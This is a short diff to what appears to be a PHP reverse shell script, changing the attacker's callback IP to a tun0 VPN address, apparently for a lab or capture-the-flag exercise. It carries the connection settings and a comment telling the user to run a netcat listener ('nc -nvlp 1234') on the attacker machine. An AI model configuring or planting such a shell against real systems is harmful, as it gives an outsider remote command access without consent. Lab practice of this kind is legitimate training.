@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.10.15.21'; // CHANGE THIS, get this from `ip a` and find the tun0 device
-$port = 1234;       // CHANGE THIS
+$ip = '10.10.14.165'; 	// CHANGE THIS, get this from `ip a` and find the tun0 device
+$port = 1234;       	// CHANGE THIS
 // run this on attacker machine:     nc -nvlp 1234
 $chunk_size = 1400;
 $write_a = null;
